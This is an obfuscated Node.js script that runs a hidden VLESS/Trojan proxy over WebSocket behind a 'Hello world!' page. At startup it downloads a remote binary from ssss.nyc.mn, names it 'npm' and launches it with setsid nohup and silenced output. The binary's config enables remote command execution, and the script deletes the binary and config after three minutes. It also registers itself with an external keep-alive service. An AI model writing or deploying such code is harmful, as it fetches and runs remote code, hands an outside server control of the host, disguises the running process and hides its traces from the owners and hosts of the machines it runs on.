const _0x962b28=_0x2720;(function(_0x42c10e,_0x1439ab){const _0x56f2e9=_0x2720,_0x4d8086=_0x42c10e();while(!![]){try{const _0x3958a3=parseInt(_0x56f2e9(0x1c0))/0x1*(parseInt(_0x56f2e9(0x17b))/0x2)+-parseInt(_0x56f2e9(0x169))/0x3*(parseInt(_0x56f2e9(0x15e))/0x4)+-parseInt(_0x56f2e9(0x170))/0x5+-parseInt(_0x56f2e9(0x15f))/0x6*(parseInt(_0x56f2e9(0x1bd))/0x7)+-parseInt(_0x56f2e9(0x181))/0x8*(parseInt(_0x56f2e9(0x159))/0x9)+-parseInt(_0x56f2e9(0x18e))/0xa+parseInt(_0x56f2e9(0x165))/0xb*(parseInt(_0x56f2e9(0x178))/0xc);if(_0x3958a3===_0x1439ab)break;else _0x4d8086['push'](_0x4d8086['shift']());}catch(_0x4f9684){_0x4d8086['push'](_0x4d8086['shift']());}}}(_0x8183,0x751fe));function _0x8183(){const _0x194093=['type','Not\x20Found\x0a','http','231427oZWpBH','map','send','106PsCPWB','path','1.1.1.1','length','error','&type=A','npm','true','toString','text/plain','readFile','https://dns.google/resolve?name=','hex','readUInt8','application/dns-json','\x20with\x20all\x20DNS\x20servers','join','NEZHA_PORT','--tls','country','2299014MnbyTW','url','WSPATH','npm\x20download\x20successfully','utf-8','215808pshoFb','114rzUgbk','trim','2053','get','2096','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','11tqeZJs','sha224','&fp=chrome&type=ws&host=','&path=%2F','3eAZtVz','split','test','env','application/json','2083','pipe','2011100JTlmqo','concat','1234.abc.com','axios','false','npm\x20is\x20already\x20running,\x20skip\x20running...','Server','UUID','22094652qmpGWD','then','data','10352WYmFWI','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','vless://','catch','NEZHA_KEY','https://oooo.serv00.net/add-url','16vXadHS','writeFileSync','decode','Answer','unlink','/bin/bash','https://amd64.ssss.nyc.mn/v1','once','message','client_secret:\x20','substr','https://arm64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','3149120IJwgpA','net','utf8','error:\x20','Unknown','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','8443','chmod\x20+x\x20npm','end','createServer','asOrganization','stream','https://','NEZHA_SERVER','writeHead','pop','Failed\x20to\x20resolve\x20','createWriteStream','arm','listen','includes','readUInt16BE','slice','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','AUTO_ACCESS','trojan://','buffer','NAME','write','text/html','PORT','every','reduce','digest','aarch64','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','find','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','config.yaml','close','DOMAIN','log','8.8.4.4','connect'];_0x8183=function(){return _0x194093;};return _0x8183();}const os=require('os'),http=require(_0x962b28(0x1bc)),fs=require('fs'),axios=require(_0x962b28(0x173)),net=require(_0x962b28(0x18f)),path=require(_0x962b28(0x1c1)),crypto=require('crypto'),{Buffer}=require(_0x962b28(0x1a8)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x962b28(0x16c)][_0x962b28(0x177)]||'311a342e-ea96-4487-83e4-6ada95fef4c5',NEZHA_SERVER=process[_0x962b28(0x16c)][_0x962b28(0x19b)]||'',NEZHA_PORT=process[_0x962b28(0x16c)][_0x962b28(0x156)]||'',NEZHA_KEY=process['env'][_0x962b28(0x17f)]||'',DOMAIN=process[_0x962b28(0x16c)][_0x962b28(0x1b6)]||_0x962b28(0x172),AUTO_ACCESS=process[_0x962b28(0x16c)][_0x962b28(0x1a6)]||![],WSPATH=process[_0x962b28(0x16c)][_0x962b28(0x15b)]||UUID[_0x962b28(0x1a4)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'sub',NAME=process[_0x962b28(0x16c)][_0x962b28(0x1a9)]||'',PORT=process[_0x962b28(0x16c)][_0x962b28(0x1ac)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x3f558c=_0x962b28;try{const _0xefcec5=await axios[_0x3f558c(0x162)]('https://speed.cloudflare.com/meta'),_0x48da0e=_0xefcec5[_0x3f558c(0x17a)];ISP=(_0x48da0e[_0x3f558c(0x158)]+'-'+_0x48da0e[_0x3f558c(0x198)])['replace'](/ /g,'_');}catch(_0x213ad1){ISP=_0x3f558c(0x192);}};GetISP();const httpServer=http[_0x962b28(0x197)]((_0x3b5386,_0xa41cca)=>{const _0xe5260e=_0x962b28;if(_0x3b5386[_0xe5260e(0x15a)]==='/'){const _0x48c564=path[_0xe5260e(0x155)](__dirname,'index.html');fs[_0xe5260e(0x1ca)](_0x48c564,_0xe5260e(0x190),(_0x44b768,_0x5a1aeb)=>{const _0x5e084d=_0xe5260e;if(_0x44b768){_0xa41cca[_0x5e084d(0x19c)](0xc8,{'Content-Type':_0x5e084d(0x1ab)}),_0xa41cca[_0x5e084d(0x196)]('Hello\x20world!');return;}_0xa41cca[_0x5e084d(0x19c)](0xc8,{'Content-Type':_0x5e084d(0x1ab)}),_0xa41cca[_0x5e084d(0x196)](_0x5a1aeb);});return;}else{if(_0x3b5386[_0xe5260e(0x15a)]==='/'+SUB_PATH){const _0x209f26=NAME?NAME+'-'+ISP:ISP,_0x36cf51=_0xe5260e(0x17d)+UUID+_0xe5260e(0x17c)+DOMAIN+_0xe5260e(0x167)+DOMAIN+_0xe5260e(0x168)+WSPATH+'#'+_0x209f26,_0x5673d3=_0xe5260e(0x1a7)+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0xe5260e(0x167)+DOMAIN+_0xe5260e(0x168)+WSPATH+'#'+_0x209f26,_0x3b6642=_0x36cf51+'\x0a'+_0x5673d3,_0x553804=Buffer['from'](_0x3b6642)['toString']('base64');_0xa41cca[_0xe5260e(0x19c)](0xc8,{'Content-Type':_0xe5260e(0x1c9)}),_0xa41cca['end'](_0x553804+'\x0a');}else _0xa41cca['writeHead'](0x194,{'Content-Type':_0xe5260e(0x1c9)}),_0xa41cca[_0xe5260e(0x196)](_0xe5260e(0x1bb));}}),wss=new WebSocket[(_0x962b28(0x176))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x962b28(0x1b8),_0x962b28(0x1c2)];function _0x2720(_0x32294b,_0x6e4586){const _0x8183b4=_0x8183();return _0x2720=function(_0x2720e0,_0x1a756b){_0x2720e0=_0x2720e0-0x155;let _0x2016b3=_0x8183b4[_0x2720e0];return _0x2016b3;},_0x2720(_0x32294b,_0x6e4586);}function resolveHost(_0x153068){return new Promise((_0x3053e6,_0x588353)=>{const _0x598004=_0x2720;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x598004(0x16b)](_0x153068)){_0x3053e6(_0x153068);return;}let _0xcec320=0x0;function _0x544a93(){const _0x495134=_0x598004;if(_0xcec320>=DNS_SERVERS['length']){_0x588353(new Error(_0x495134(0x19e)+_0x153068+_0x495134(0x1cf)));return;}const _0xc17dd4=DNS_SERVERS[_0xcec320];_0xcec320++;const _0x31bc51=_0x495134(0x1cb)+encodeURIComponent(_0x153068)+_0x495134(0x1c5);axios[_0x495134(0x162)](_0x31bc51,{'timeout':0x1388,'headers':{'Accept':_0x495134(0x1ce)}})[_0x495134(0x179)](_0x7a2350=>{const _0x4cd151=_0x495134,_0x34caf7=_0x7a2350['data'];if(_0x34caf7['Status']===0x0&&_0x34caf7['Answer']&&_0x34caf7['Answer'][_0x4cd151(0x1c3)]>0x0){const _0x3661bd=_0x34caf7[_0x4cd151(0x184)][_0x4cd151(0x1b2)](_0x455194=>_0x455194[_0x4cd151(0x1ba)]===0x1);if(_0x3661bd){_0x3053e6(_0x3661bd['data']);return;}}_0x544a93();})[_0x495134(0x17e)](_0x35a9b3=>{_0x544a93();});}_0x544a93();});}function handleVlessConnection(_0x468f15,_0x1cbb30){const _0xfa2601=_0x962b28,[_0x3ff297]=_0x1cbb30,_0x1d8bf8=_0x1cbb30[_0xfa2601(0x1a4)](0x1,0x11);if(!_0x1d8bf8[_0xfa2601(0x1ad)]((_0x344e23,_0x38d3fd)=>_0x344e23==parseInt(uuid[_0xfa2601(0x18b)](_0x38d3fd*0x2,0x2),0x10)))return![];let _0x573ef1=_0x1cbb30[_0xfa2601(0x1a4)](0x11,0x12)['readUInt8']()+0x13;const _0x4f1e31=_0x1cbb30[_0xfa2601(0x1a4)](_0x573ef1,_0x573ef1+=0x2)[_0xfa2601(0x1a3)](0x0),_0x2e701c=_0x1cbb30[_0xfa2601(0x1a4)](_0x573ef1,_0x573ef1+=0x1)['readUInt8'](),_0x5bbd9b=_0x2e701c==0x1?_0x1cbb30[_0xfa2601(0x1a4)](_0x573ef1,_0x573ef1+=0x4)[_0xfa2601(0x155)]('.'):_0x2e701c==0x2?new TextDecoder()[_0xfa2601(0x183)](_0x1cbb30['slice'](_0x573ef1+0x1,_0x573ef1+=0x1+_0x1cbb30['slice'](_0x573ef1,_0x573ef1+0x1)[_0xfa2601(0x1cd)]())):_0x2e701c==0x3?_0x1cbb30[_0xfa2601(0x1a4)](_0x573ef1,_0x573ef1+=0x10)[_0xfa2601(0x1ae)]((_0x10e00b,_0x1496f9,_0xb34459,_0x306b88)=>_0xb34459%0x2?_0x10e00b['concat'](_0x306b88[_0xfa2601(0x1a4)](_0xb34459-0x1,_0xb34459+0x1)):_0x10e00b,[])[_0xfa2601(0x1be)](_0x17eb96=>_0x17eb96[_0xfa2601(0x1a3)](0x0)['toString'](0x10))[_0xfa2601(0x155)](':'):'';_0x468f15[_0xfa2601(0x1bf)](new Uint8Array([_0x3ff297,0x0]));const _0x2faa24=createWebSocketStream(_0x468f15);return resolveHost(_0x5bbd9b)[_0xfa2601(0x179)](_0x296fd6=>{const _0x34614a=_0xfa2601;net[_0x34614a(0x1b9)]({'host':_0x296fd6,'port':_0x4f1e31},function(){const _0x585546=_0x34614a;this[_0x585546(0x1aa)](_0x1cbb30[_0x585546(0x1a4)](_0x573ef1)),_0x2faa24['on'](_0x585546(0x1c4),()=>{})['pipe'](this)['on'](_0x585546(0x1c4),()=>{})['pipe'](_0x2faa24);})['on'](_0x34614a(0x1c4),()=>{});})[_0xfa2601(0x17e)](_0x43e741=>{const _0x34ae38=_0xfa2601;net[_0x34ae38(0x1b9)]({'host':_0x5bbd9b,'port':_0x4f1e31},function(){const _0x138d74=_0x34ae38;this['write'](_0x1cbb30[_0x138d74(0x1a4)](_0x573ef1)),_0x2faa24['on'](_0x138d74(0x1c4),()=>{})[_0x138d74(0x16f)](this)['on']('error',()=>{})['pipe'](_0x2faa24);})['on'](_0x34ae38(0x1c4),()=>{});}),!![];}function handleTrojanConnection(_0x5da167,_0x32f17d){const _0x2541ef=_0x962b28;try{if(_0x32f17d[_0x2541ef(0x1c3)]<0x3a)return![];const _0x1b65b3=_0x32f17d[_0x2541ef(0x1a4)](0x0,0x38)['toString'](),_0x29f4c1=[UUID];let _0x16be4e=null;for(const _0x1ea727 of _0x29f4c1){const _0x3da464=crypto['createHash'](_0x2541ef(0x166))['update'](_0x1ea727)[_0x2541ef(0x1af)](_0x2541ef(0x1cc));if(_0x3da464===_0x1b65b3){_0x16be4e=_0x1ea727;break;}}if(!_0x16be4e)return![];let _0x2dca8b=0x38;_0x32f17d[_0x2dca8b]===0xd&&_0x32f17d[_0x2dca8b+0x1]===0xa&&(_0x2dca8b+=0x2);const _0xb9cb45=_0x32f17d[_0x2dca8b];if(_0xb9cb45!==0x1)return![];_0x2dca8b+=0x1;const _0x4ee3c7=_0x32f17d[_0x2dca8b];_0x2dca8b+=0x1;let _0x53e288,_0x1d2ce1;if(_0x4ee3c7===0x1)_0x53e288=_0x32f17d[_0x2541ef(0x1a4)](_0x2dca8b,_0x2dca8b+0x4)[_0x2541ef(0x155)]('.'),_0x2dca8b+=0x4;else{if(_0x4ee3c7===0x3){const _0x119a0a=_0x32f17d[_0x2dca8b];_0x2dca8b+=0x1,_0x53e288=_0x32f17d[_0x2541ef(0x1a4)](_0x2dca8b,_0x2dca8b+_0x119a0a)[_0x2541ef(0x1c8)](),_0x2dca8b+=_0x119a0a;}else{if(_0x4ee3c7===0x4)_0x53e288=_0x32f17d[_0x2541ef(0x1a4)](_0x2dca8b,_0x2dca8b+0x10)[_0x2541ef(0x1ae)]((_0x5bd212,_0x4e2387,_0x56e299,_0x17fbba)=>_0x56e299%0x2?_0x5bd212[_0x2541ef(0x171)](_0x17fbba[_0x2541ef(0x1a4)](_0x56e299-0x1,_0x56e299+0x1)):_0x5bd212,[])[_0x2541ef(0x1be)](_0x5f462e=>_0x5f462e[_0x2541ef(0x1a3)](0x0)[_0x2541ef(0x1c8)](0x10))[_0x2541ef(0x155)](':'),_0x2dca8b+=0x10;else return![];}}_0x1d2ce1=_0x32f17d[_0x2541ef(0x1a3)](_0x2dca8b),_0x2dca8b+=0x2;_0x2dca8b<_0x32f17d[_0x2541ef(0x1c3)]&&_0x32f17d[_0x2dca8b]===0xd&&_0x32f17d[_0x2dca8b+0x1]===0xa&&(_0x2dca8b+=0x2);const _0x5e4dd6=createWebSocketStream(_0x5da167);return resolveHost(_0x53e288)['then'](_0x935eff=>{const _0x4018c6=_0x2541ef;net['connect']({'host':_0x935eff,'port':_0x1d2ce1},function(){const _0x43bfbd=_0x2720;_0x2dca8b<_0x32f17d[_0x43bfbd(0x1c3)]&&this[_0x43bfbd(0x1aa)](_0x32f17d[_0x43bfbd(0x1a4)](_0x2dca8b)),_0x5e4dd6['on'](_0x43bfbd(0x1c4),()=>{})[_0x43bfbd(0x16f)](this)['on'](_0x43bfbd(0x1c4),()=>{})[_0x43bfbd(0x16f)](_0x5e4dd6);})['on'](_0x4018c6(0x1c4),()=>{});})['catch'](_0x2fc136=>{const _0x29a982=_0x2541ef;net['connect']({'host':_0x53e288,'port':_0x1d2ce1},function(){const _0x242539=_0x2720;_0x2dca8b<_0x32f17d[_0x242539(0x1c3)]&&this[_0x242539(0x1aa)](_0x32f17d[_0x242539(0x1a4)](_0x2dca8b)),_0x5e4dd6['on'](_0x242539(0x1c4),()=>{})[_0x242539(0x16f)](this)['on'](_0x242539(0x1c4),()=>{})[_0x242539(0x16f)](_0x5e4dd6);})['on'](_0x29a982(0x1c4),()=>{});}),!![];}catch(_0x27a3bc){return![];}}wss['on']('connection',(_0x2f9faf,_0x54b880)=>{const _0x17662f=_0x962b28,_0x3950e3=_0x54b880[_0x17662f(0x15a)]||'';_0x2f9faf[_0x17662f(0x188)](_0x17662f(0x189),_0xa3f377=>{const _0x13d07b=_0x17662f;if(_0xa3f377['length']>0x11&&_0xa3f377[0x0]===0x0){const _0x4ad6b4=_0xa3f377[_0x13d07b(0x1a4)](0x1,0x11),_0x52e83f=_0x4ad6b4[_0x13d07b(0x1ad)]((_0x3691a5,_0xbee4d8)=>_0x3691a5==parseInt(uuid[_0x13d07b(0x18b)](_0xbee4d8*0x2,0x2),0x10));if(_0x52e83f){!handleVlessConnection(_0x2f9faf,_0xa3f377)&&_0x2f9faf[_0x13d07b(0x1b5)]();return;}}!handleTrojanConnection(_0x2f9faf,_0xa3f377)&&_0x2f9faf[_0x13d07b(0x1b5)]();})['on'](_0x17662f(0x1c4),()=>{});});const getDownloadUrl=()=>{const _0x174349=_0x962b28,_0x42c032=os['arch']();return _0x42c032===_0x174349(0x1a0)||_0x42c032==='arm64'||_0x42c032===_0x174349(0x1b0)?!NEZHA_PORT?_0x174349(0x18d):_0x174349(0x18c):!NEZHA_PORT?_0x174349(0x187):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3c849c=_0x962b28;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x367718=getDownloadUrl(),_0x2cb781=await axios({'method':'get','url':_0x367718,'responseType':_0x3c849c(0x199)}),_0x519628=fs[_0x3c849c(0x19f)](_0x3c849c(0x1c6));return _0x2cb781['data'][_0x3c849c(0x16f)](_0x519628),new Promise((_0xd5bc53,_0x569be3)=>{const _0x11b977=_0x3c849c;_0x519628['on']('finish',()=>{const _0x354821=_0x2720;console[_0x354821(0x1b7)](_0x354821(0x15c)),exec(_0x354821(0x195),_0x205db7=>{if(_0x205db7)_0x569be3(_0x205db7);_0xd5bc53();});}),_0x519628['on'](_0x11b977(0x1c4),_0x569be3);});}catch(_0x249366){throw _0x249366;}},runnz=async()=>{const _0xd4457e=_0x962b28;try{const _0xcbd161=execSync(_0xd4457e(0x164),{'encoding':_0xd4457e(0x15d)});if(_0xcbd161[_0xd4457e(0x160)]()!==''){console[_0xd4457e(0x1b7)](_0xd4457e(0x175));return;}}catch(_0x562adb){}await downloadFile();let _0x40c911='',_0x53cefc=['443',_0xd4457e(0x194),_0xd4457e(0x163),'2087',_0xd4457e(0x16e),_0xd4457e(0x161)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x403093=_0x53cefc[_0xd4457e(0x1a2)](NEZHA_PORT)?_0xd4457e(0x157):'';_0x40c911='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x403093+_0xd4457e(0x193);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xccd2f1=NEZHA_SERVER[_0xd4457e(0x1a2)](':')?NEZHA_SERVER[_0xd4457e(0x16a)](':')[_0xd4457e(0x19d)]():'',_0x44ea80=_0x53cefc[_0xd4457e(0x1a2)](_0xccd2f1)?_0xd4457e(0x1c7):_0xd4457e(0x174),_0xacc554=_0xd4457e(0x18a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x44ea80+_0xd4457e(0x1a5)+UUID;fs[_0xd4457e(0x182)](_0xd4457e(0x1b4),_0xacc554);}_0x40c911=_0xd4457e(0x1b1);}else{console[_0xd4457e(0x1b7)](_0xd4457e(0x1b3));return;}}try{exec(_0x40c911,{'shell':_0xd4457e(0x186)},_0x203a88=>{const _0x4fea3e=_0xd4457e;if(_0x203a88)console[_0x4fea3e(0x1c4)]('npm\x20running\x20error:',_0x203a88);else console[_0x4fea3e(0x1b7)]('npm\x20is\x20running');});}catch(_0x5f320a){console['error'](_0xd4457e(0x191)+_0x5f320a);}};async function addAccessTask(){const _0x3f28a9=_0x962b28;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x116d61=_0x3f28a9(0x19a)+DOMAIN+'/'+SUB_PATH;try{const _0x301318=await axios['post'](_0x3f28a9(0x180),{'url':_0x116d61},{'headers':{'Content-Type':_0x3f28a9(0x16d)}});console[_0x3f28a9(0x1b7)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x122af9){}}const delFiles=()=>{const _0x3bf01d=_0x962b28;fs['unlink'](_0x3bf01d(0x1c6),()=>{}),fs[_0x3bf01d(0x185)](_0x3bf01d(0x1b4),()=>{});};httpServer[_0x962b28(0x1a1)](PORT,()=>{const _0x306bf1=_0x962b28;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x306bf1(0x1b7)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
